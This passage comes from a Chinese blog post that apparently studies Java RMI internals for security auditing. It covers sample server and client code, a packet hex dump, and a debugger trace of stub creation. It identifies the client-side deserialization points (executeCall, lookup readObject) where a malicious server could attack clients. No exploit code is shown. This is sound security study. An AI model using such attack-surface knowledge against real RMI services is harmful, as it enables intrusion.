class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能够从远端的服务端中调用 RemoteHelloWorld 对象的 <code>sayHello()</code> 方法了。</p><h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img src="https://bu.dusays.com/2024/05/23/664f0226a2cd1.png" alt="image-20240520091844396"></p><p>可以看到这里客户端（右边）没有实现具体的方法内容，但是执行了服务端（左边）的方法体内的代码</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>其实接口也可以直接继承</p><p>我们前⾯要继承 Remote 并将我们需要调⽤的⽅法写在接⼝IRemoteHelloWorld ⾥，因为客户端也需要⽤到这个接⼝</p><p>也就是：</p><p>服务端：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.RMI;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span></span><br><span class="line"><span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"> System.out.println(<span class="string">&quot;call from&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;Hello world&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line"> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"> Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我三合一了 运行的时候要分开</p><p>客户端：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Train;</span><br><span class="line"><span class="keyword">import</span> org.vulhub.RMI.RMIServer;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainMain</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"> RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class="line">Naming.lookup(<span class="string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>);</span><br><span class="line"> <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> hello.hello();</span><br><span class="line"> System.out.println( ret);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端就简单多了，使⽤ Naming.lookup 在Registry中寻找到名字是Hello的对象，后⾯的使⽤就和在本地使⽤⼀样了。</p><p>这里我们可以wireshark抓包看下</p><p><img src="https://bu.dusays.com/2024/05/23/664f02235d9de.png" alt="image-20240520092218051"></p><p>如上图</p><p>这就是完整的通信过程，我们可以发现，整个过程进⾏了两次TCP握⼿，也就是我们实际建⽴了两次TCP连接</p><p>第⼀次建⽴TCP连接是连接远端 192.168.135.142 的1099端⼝，这也是我们在代码⾥看到的端⼝，⼆者进⾏沟通后，我向远端发送了⼀个“Call”消息，远端回复了⼀个“ReturnData”消息，然后我新建了⼀个TCP连接，连到远端的33769端⼝</p><p>那为什么要连接33769端口呢：</p><p>细细阅读数据包我们会发现，在“ReturnData”这个包中，返回了⽬标的IP地址 192.168.135.142 ，其后跟的⼀个字节 \x00\x00\x83\xE9 ，刚好就是整数 33769 的⽹络序列：</p><p>如下：</p><p>0030 .. .. .. .. .. .. .. ac ed 00 05 77 0f 01 18 35 ……Q….w…5</p><p>0040 cf d9 00 00 01 6c 39 4f ec 84 80 08 73 7d 00 00 …..l9O….s}..</p><p>0050 00 02 00 0f 6a 61 76 61 2e 72 6d 69 2e 52 65 6d ….java.rmi.Rem</p><p>0060 6f 74 65 00 2a 6f 72 67 2e 76 75 6c 68 75 62 2e ote.*org.vulhub.</p><p>0070 52 4d 49 2e 52 4d 49 53 65 72 76 65 72 24 49 52 RMI.RMIServer$IR</p><p>0080 65 6d 6f 74 65 48 65 6c 6c 6f 57 6f 72 6c 64 70 emoteHelloWorldp</p><p>0090 78 72 00 17 6a 61 76 61 2e 6c 61 6e 67 2e 72 65 xr..java.lang.re</p><p>00a0 66 6c 65 63 74 2e 50 72 6f 78 79 e1 27 da 20 cc flect.Proxy.’. .</p><p>00b0 10 43 cb 02 00 01 4c 00 01 68 74 00 25 4c 6a 61 .C….L..ht.%Lja</p><p>00c0 76 61 2f 6c 61 6e 67 2f 72 65 66 6c 65 63 74 2f va&#x2F;lang&#x2F;reflect&#x2F;</p><p>00d0 49 6e 76 6f 63 61 74 69 6f 6e 48 61 6e 64 6c 65 InvocationHandle</p><p>00e0 72 3b 70 78 70 73 72 00 2d 6a 61 76 61 2e 72 6d r;pxpsr.-java.rm</p><p>00f0 69 2e 73 65 72 76 65 72 2e 52 65 6d 6f 74 65 4f i.server.RemoteO</p><p>0100 62 6a 65 63 74 49 6e 76 6f 63 61 74 69 6f 6e 48 bjectInvocationH</p><p>0110 61 6e 64 6c 65 72 00 00 00 00 00 00 00 02 02 00 andler……….</p><p>0120 00 70 78 72 00 1c 6a 61 76 61 2e 72 6d 69 2e 73 .pxr..java.rmi.s</p><p>0130 65 72 76 65 72 2e 52 65 6d 6f 74 65 4f 62 6a 65 erver.RemoteObje</p><p>0140 63 74 d3 61 b4 91 0c 61 33 1e 03 00 00 70 78 70 ct.a…a3….pxp</p><p>0150 77 38 00 0a 55 6e 69 63 61 73 74 52 65 66 00 0f w8..UnicastRef..</p><p>0160 31 39 32 2e 31 36 38 2e 31 33 35 2e 31 34 32 00 192.168.135.142.</p><p>0170 00 83 e9 1b 78 c2 0b 23 a0 69 c0 18 35 cf d9 00 ….x..#.i..5…</p><p>0180 00 01 6c 39 4f ec 84 80 01 01 78                ..l9O…..x</p><p>其实这段数据流中从 \xAC\xED 开始往后就是Java序列化数据了，IP和端⼝只是这个对象的⼀部分罢了</p><p>所以rmi的利用也就是通过反序列化进行利用</p><p>所以捋⼀捋这整个过程，⾸先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回⼀个序列化的数据，这个就是找到的Name&#x3D;Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在192.168.135.142:33769 ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程⽅法调⽤，也就是 hello() </p><p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMIServer；最后，远程⽅法实际上在RMI Server上调⽤。</p><p>但是为什么示例代码只有两个部分呢？</p><p>原因是，通常我们在新建一个RMI Registry的时候，都会直接绑定一个对象在上面，也就是说我们示例代码中的Server其实包含了Registry和Server两部分：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(1099);</span><br><span class="line">Naming.bind(&quot;rmi://127.0.0.1:1099/Hello&quot;, new RemoteHelloWorld());</span><br></pre></td></tr></table></figure><p>第一行创建并运行RMI Registry，第二行将RemoteHelloWorld对象绑定到Hello这个名字上。</p><p>Naming.bind 的第一个参数是一个URL，形如： rmi:&#x2F;&#x2F;host:port&#x2F;name 。其中，host和port就是RMI Registry的地址和端口，name是远程对象的名字。</p><p>如果RMI Registry在本地运行，那么host和port是可以省略的，此时host默认是 localhost ，port默认是 1099 ：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Naming.bind(&quot;Hello&quot;, new RemoteHelloWorld());</span><br></pre></td></tr></table></figure><h2 id="RMI-代码审计"><a href="#RMI-代码审计" class="headerlink" title="RMI-代码审计"></a>RMI-代码审计</h2><p>首先 RMI 有三部分：</p><ul><li>RMI Registry</li><li>RMI Server</li><li>RMI Client</li></ul><p>如果两两通信就是 3+2+1 &#x3D; 6 个交互流程，还有三个创建的过程，一共是九个过程。</p><p>产生漏洞的地方肯定是在交互过程中发生的，但是出问题的是在哪部分呢？为了寻找问题到底是出在哪部分，我们从服务端的创建开始逐个分析。</p><h3 id="服务端的创建流程"><a href="#服务端的创建流程" class="headerlink" title="服务端的创建流程"></a>服务端的创建流程</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始分析创建远程对象的这个流程，因为这个流程是把服务发布到网上，我们一步一步来看它是如何发布的。<br>在图示地方下断点：</p><p><img src="https://bu.dusays.com/2024/05/24/664fedc33d66e.png" alt="image-20240524093040930"></p><p>下一步走到构造函数：</p><p><img src="https://bu.dusays.com/2024/05/24/664fedd8d9014.png" alt="image-20240524093102686"></p><p>再下一步走到 UnicastRemoteObject 的构造函数：</p><p><img src="https://bu.dusays.com/2024/05/24/664fedf06bcfe.png" alt="image-20240524093126185"></p><p><img src="https://bu.dusays.com/2024/05/24/664fee0244f07.png" alt="image-20240524093144220"></p><p>同时注意到此时的 port 是 0，这里的 0 就是代表默认值（如果传入 0 的话，会开启一个随机端口）。因为这里是把服务发布到网络上（如果对端口有疑惑为什么不是 1099 的要注意区分注册中心和服务端口的区别），所以不可能每种服务固定一个端口，这样子一旦服务过多端口会不够用的。</p><p>下一步我们跟到调用 exportObject（导出对象）这个地方：</p><p><img src="https://bu.dusays.com/2024/05/24/664fee30beef5.png" alt="image-20240524093230656"></p><p>根据英文意思这里就是发布对象的感觉，这是一个静态函数，而且也是关键语句。因此我们在 RemoteObjImpl 这个类中也可以不继承 UnicastRemoteObject 这个类，直接在构造函数中调用这个静态方法也可以。</p><p>这个 obj 是我们要实现的真正逻辑，后面的 new UnicastServerRef 是用于处理网络请求的，可以注意到这里只传了 port 进去，因此 ip 是他可以自动获取到的。</p><p>下一步：</p><p><img src="https://bu.dusays.com/2024/05/24/664fee41e0137.png" alt="image-20240524093247800"></p><p>可以看见新建了一个类 LiveRef，我们跟进</p><p><img src="https://bu.dusays.com/2024/05/24/664fee57ec039.png" alt="image-20240524093309872"></p><p>传进去的是一个 ID 和一个 port，ID 就是理解成给个编号吧，port 就是之前的默认 0 端口<br>然后我们 ID 就不看了，直接跟进他的构造函数：</p><p><img src="https://bu.dusays.com/2024/05/24/664fee665ba94.png" alt="image-20240524093324263"></p><p>然后可以看到</p><blockquote><p>第一个参数是 ID<br>第二个参数是 TCPEndpointD 的一个静态函数<br>第三个参数 true</p></blockquote><p>我们这里只看第二个参数。这里没有必要继续 debug 跟进，直接 debug 停在这里，然后 Ctrl + 鼠标左键 点击进入即可</p><p><img src="https://bu.dusays.com/2024/05/24/664fee78b4544.png" alt="image-20240524093342633"></p><p><img src="https://bu.dusays.com/2024/05/24/664fee88c7e99.png" alt="image-20240524093358610"></p><p>可以看到他的里面是返回类型为 TCPEndpoint 的一个东西，再看一下 TCPEndpoint 的构造函数：</p><p><img src="https://bu.dusays.com/2024/05/24/664fee9dad7ea.png" alt="image-20240524093419601"></p><p>发现这里他要接受两个参数，host 和 port。可以感受到这个东西就是一个处理网络请求的东西</p><p>然后我们返回到 debug 的地方。</p><p><img src="https://bu.dusays.com/2024/05/24/664feeabb75e0.png" alt="image-20240524093433656"></p><p>这里调用了另一个 LiveRef 构造函数。我们再看一下 LiveRef 的构造函数：</p><p><img src="https://bu.dusays.com/2024/05/24/664feebd72928.png" alt="image-20240524093451298"></p><p>接收三个参数，ID，Endpoint，isLocal<br>其他都好理解，主要就是这个 Endpoint 是什么，我们看一下它里面有什么东西：</p><p><img src="https://bu.dusays.com/2024/05/24/664feecd4c8f9.png" alt="image-20240524093507103"></p><p>发现这里 host 已经被获取了<br>但是 port 还是 0，port 如何获取我们后面在分析</p><p>LiveRef 的创建到这里就完成了，我们需要记住 LiveRef 的 ID，并且我们从头到尾只创建了这一个 LiveRef</p><p>再往下走，这里也只进行了赋值：</p><p><img src="https://bu.dusays.com/2024/05/24/664feee103b2b.png" alt="image-20240524093526936"></p><p>继续往下走：</p><p><img src="https://bu.dusays.com/2024/05/24/664feef0e2095.png" alt="image-20240524093542776"></p><p><img src="https://bu.dusays.com/2024/05/24/664fef051f9c0.png" alt="image-20240524093602957"></p><p>这里的 UnicastServRef 就是刚才赋值的的那个东西，只不过包装了而已，而且这也进行了赋值<br>然后继续往下走到 sref.exportObject，继续对 sref “exportObject”</p><p><img src="https://bu.dusays.com/2024/05/24/664fef186d0fe.png" alt="image-20240524093622152"></p><p>但是我们发现这里创建了代理 stub</p><p><strong>stub 明明是客户端的代理，为什么要在服务端创建</strong></p><p>因为需要现在服务端创建完这个代理放在注册中心，客户端再到注册中心去使用这个 stub 进行操作</p><p>我们往下看一下这个 stub 是怎么创建的<br>第一步是创建一个远程对象类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; remoteClass;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    remoteClass = getRemoteClass(implClass);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException ex ) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">        <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">        implClass.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二步是判断：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (forceStubUse ||!(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line"> </span><br><span class="line">forceStubUse 表示当不存在时是否抛出异常</span><br><span class="line">是否存在以 _Stub 结尾的类。remoteClass + <span class="string">&quot;_Stub&quot;</span> </span><br></pre></td></tr></table></figure><p>stubClassExists 的具体逻辑是这样的：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第三步就是创建动态代理了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                           interfaces,</span><br><span class="line">                                                           handler);</span><br><span class="line">                &#125;&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>创建完 stub，就是收尾工作，这里创建了一个 Target</p><p><img src="https://bu.dusays.com/2024/05/24/664fef2e22f14.png" alt="image-20240524093644044"></p><p><img src="https://bu.dusays.com/2024/05/24/664fef3f7400b.png" alt="image-20240524093701235"></p><p>这里可以看到 LiveRef 的 id 是一样的，ObjectID 也都是一样的，说明用的都是同一个 LiveRef。</p><p>创建完 Target 就进行发布</p><p><img src="https://bu.dusays.com/2024/05/24/664fef51df676.png" alt="image-20240524093719752"></p><p>就是对这个 target 进行发布</p><p><img src="https://bu.dusays.com/2024/05/24/664fef6273d7d.png" alt="image-20240524093736379"></p><p><img src="https://bu.dusays.com/2024/05/24/664fef75873e7.png" alt="image-20240524093755406"></p><p><img src="https://bu.dusays.com/2024/05/24/664fef86b4360.png" alt="image-20240524093812570"></p><p>我们跟进到 listen 里面：</p><p><img src="https://bu.dusays.com/2024/05/24/664fefa06b49d.png" alt="image-20240524093837670"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">server = ep.newServerSocket();</span><br></pre></td></tr></table></figure><p>这个部分获取了随机的端口号</p><p><img src="https://bu.dusays.com/2024/05/24/664fefb4a7adf.png" alt="image-20240524093858197"></p><p>可以发现这里创建了一个 Socket 等待别人连接，并且使用了 t.start () 创建一个新的线程。</p><p>此时已经成功把服务发布到网络上面了，但是客户端并不知道，注册中心也不知道，所以他自己需要先记录一下这个发布的服务</p><p><img src="https://bu.dusays.com/2024/05/24/664fefcb272db.png" alt="image-20240524093920972"></p><p><img src="https://bu.dusays.com/2024/05/24/664fefde1e86b.png" alt="image-20240524093939909"></p><p>发现这里是用 Map 来记录的，并且把刚才创建的 target 当作值。同时这里还是一个静态表</p><blockquote><p>从思路来说是不难的，也就是发布远程对象，用 <code>exportObject()</code> 指定到发布的 IP 与端口，端口的话是一个随机值。至始至终复杂的地方其实都是在赋值，创建类，进行各种各样的封装，实际上并不复杂。</p><p>还有一个过程就是发布完成之后的记录，理解的话，类似于日志就可以了，这些记录是保存到静态的 HashMap 当中。</p><p>这一块是服务端自己创建远程服务的这么一个操作，所以<strong>这一块是不存在漏洞的</strong>。</p></blockquote><h3 id="注册中心的创建流程"><a href="#注册中心的创建流程" class="headerlink" title="注册中心的创建流程"></a>注册中心的创建流程</h3><p>注册中心的创建和远程服务的发布其实是没有关系的，他们之间并不在乎谁先谁后。因为<strong>发布远程服务和注册中心的创建他们本质上都是一样的</strong>，都是把某个服务发布到某个端口上，只不过注册中心通常是固定在 1099 端口，而服务则是随机发布到某一个端口上。</p><p>在 <code>Registry registry= LocateRegistry.createRegistry(1099);</code> 处下断点，我们开始调试代码。</p><p><img src="https://bu.dusays.com/2024/05/24/664fefedd1aab.png" alt="image-20240524093955695"></p><p>首先是进入了静态方法 createRegisty，并且传入了 port1099.<br>然后这里 new 了一个 RegistryImpl，我们就顺势走到 RegistryImpl 的构造方法：</p><p><img src="https://bu.dusays.com/2024/05/24/664feffd4fdaa.png" alt="image-20240524094011234"></p><p><code>if</code> 里面主要是做一些检查，不重要。</p><p>重点看下面的 new 一个 LiveRef，然后又 new 了一个 UnicastServRef，并且把 LiveRef 放在里面，之后调用了 setup。</p><p>这里其实和前面服务端的创建时一样的流程。只是这里调用了 setup 方法，直接进去看一下。</p><p><img src="https://bu.dusays.com/2024/05/24/664ff013cccec.png" alt="image-20240524094033309"></p><p>创建注册中心的流程，前三步是不是都和发布远程对象一样的步骤，接下来其实也是调用了 <code>UnicastServerRef.exportObject</code> 了。这样看来，其实发布远程对象和创建注册中心本质上就是一样的了，他们都执行了一样的步骤。<br>唯一的区别就是调用时第三个参数 permanent 不一样，其实就是代表一个是永久，而另一个是非永久罢了。</p><p><img src="https://bu.dusays.com/2024/05/24/664ff0222fc5d.png" alt="image-20240524094048100"></p><p>接下来我们继续跟进到 exportObject 函数里面</p><p><img src="https://bu.dusays.com/2024/05/24/664ff03b98b8d.png" alt="image-20240524094113241"></p><p>到目前为止和我们之前调试发布远程对象都一样，但是我们跟进到 createProxy 里面就开始有区别了</p><p><img src="https://bu.dusays.com/2024/05/24/664ff04a7b080.png" alt="image-20240524094128076"></p><p>因为这里会执行一个 stubClassExists，这个函数的代码逻辑如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//功能就是判断JDK中是否有以xxx_Stub的类，有的话就加载</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/24/664ff05ba941b.png" alt="image-20240524094145404"></p><p>于是就会进入这个类中把他加载出来，具体的加载逻辑是这样的</p><p><img src="https://bu.dusays.com/2024/05/24/664ff06a25c93.png" alt="image-20240524094159866"></p><p>这里利用反射 forName 获取类名，然后利用构造器进行实例化加载这个类</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">这里和服务端的区别就是：服务端是利用动态代理创建出来的，而注册中心是利用JDK自由的类反射创建出来的</span><br></pre></td></tr></table></figure><p>接着往下走</p><p><img src="https://bu.dusays.com/2024/05/24/664ff0798b933.png" alt="image-20240524094215278"></p><p>这一步就是判断 stub 是否是服务端定义好的</p><p>因为这里的 stub 确实是服务端已经定义好的，于是我们跟进到 setSkeleton 里面：</p><p><img src="https://bu.dusays.com/2024/05/24/664ff08ad93d2.png" alt="image-20240524094232532"></p><p>再跟到 createSkeleton</p><p><img src="https://bu.dusays.com/2024/05/24/664ff0abc97b3.png" alt="image-20240524094305522"></p><p>发现这里和上面创建 stub 一样也是直接利用反射获取 JDK 的类名来实例化这个类<br>出来之后就是创建 target，然后发布到网络上，和发布远程对象一样的。</p><p>下一步一样的，封装 target。</p><p><img src="https://bu.dusays.com/2024/05/24/664ff0bc012ca.png" alt="image-20240524094321444"></p><p>可以看到这里还是同一个 LiveRef。</p><p><img src="https://bu.dusays.com/2024/05/24/664ff0ced4144.png" alt="image-20240524094340627"></p><p>DGC（分布式垃圾回收）</p><p><img src="https://bu.dusays.com/2024/05/24/664ff0df0f306.png" alt="image-20240524094356857"></p><p>可以注意到远程服务的 stub 类型是动态代理创建的类型为 <strong>$Proxy0</strong></p><h4 id="注册绑定"><a href="#注册绑定" class="headerlink" title="注册绑定"></a>注册绑定</h4><p>这个 checkAccess 就是判断是否本地绑定</p><p><img src="https://bu.dusays.com/2024/05/24/664ff106652db.png" alt="image-20240524094436152"></p><p>然后上面那个判断就是判断这个 name 是否绑定过，没绑定过就 put 呗<br>这个 bingdings 本质上就是一个 HashTable，然后把远程对象绑定进去</p><h3 id="客户端请求注册中心和服务端"><a href="#客户端请求注册中心和服务端" class="headerlink" title="客户端请求注册中心和服务端"></a>客户端请求注册中心和服务端</h3><p>客户端需要做两件事：</p><p>1、向注册中心获取远程对象的代理</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br></pre></td></tr></table></figure><p>2、通过这个代理向服务端做远程调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.out.println(remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>));</span><br></pre></td></tr></table></figure><h4 id="获取远程对象的代理"><a href="#获取远程对象的代理" class="headerlink" title="获取远程对象的代理"></a>获取远程对象的代理</h4><p><img src="https://bu.dusays.com/2024/05/24/664ff1180fff0.png" alt="image-20240524094453917"></p><p>我们可以发现他的流程和服务端的一样：</p><p><img src="https://bu.dusays.com/2024/05/24/664ff12a13343.png" alt="image-20240524094511812"></p><p>都是重新 createProxy，然后利用 forName 来加载类</p><p>执行完后我们可以看到：</p><p><img src="https://bu.dusays.com/2024/05/24/664ff13d56a05.png" alt="image-20240524094531134"></p><p>这里就是获取注册中心的 stub 对象，下一步就是通过名字来获取远程对象</p><p>我们往下看 lookup</p><p>这里因为 <code>RegistryImpl_Stub.class</code> 是 <code>java 1.1</code> 编译的。但是我们的环境是 <code>java 1.8</code> 所以，这里在进行反编译的时候，就会因为反编译的时候，行号会乱。而且无法进行 debug</p><p>直接看静态代码。</p><p><img src="https://bu.dusays.com/2024/05/24/664ff160a23db.png" alt="image-20240524094606088"></p><p>下面那个 newCall 就是创建一个连接</p><p>然后有一个 writeObject (var1), 这个 var1 就是我们传进来的字符串。我们发现了他被序列化了，到时候注册中心就会反序列化读取他</p><p>再往下就是重点 invoke 方法</p><p><img src="https://bu.dusays.com/2024/05/24/664ff1715eb3b.png" alt="image-20240524094623214"></p><p><code>invoke</code> 方法会调用 <code>executeCall()</code> 方法<br><code>executeCall()</code> 方法中的捕获异常中有一个 <strong>readObject</strong>：</p><p><img src="https://bu.dusays.com/2024/05/24/664ff17fa70e6.png" alt="image-20240524094637515"></p><p><strong>在这里如果服务端是一个恶意的类被服务端加载的话，就可以达到攻击客户端的目的</strong></p><p>执行完 invoke 下面还有一个攻击客户端的利用点：</p><p><img src="https://bu.dusays.com/2024/05/24/664ff18f33fdb.png" alt="image-20240524094652850"></p><p>因为这里客户端获取服务端的远程对象的过程是通过反序列化读取他的，那么<strong>如果服务端是恶意的反序列反参数就可以攻击客户端</strong></p><p>但是这两个反序列的攻击点还是 invoke 进去的 <strong>executeCall ()</strong> 这里更加隐蔽，更加常用到。因为很多函数都会调用 invoke 方法。如 bind ()，list ()</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>客户端请求注册中心的时候，有两个反序列化的点：<code>executeCall()</code> 和 <code>lookup</code> 里面的 <code>readObject</code></p><h4 id="向服务端做远程调用"><a href="#向服务端做远程调用" class="headerlink" 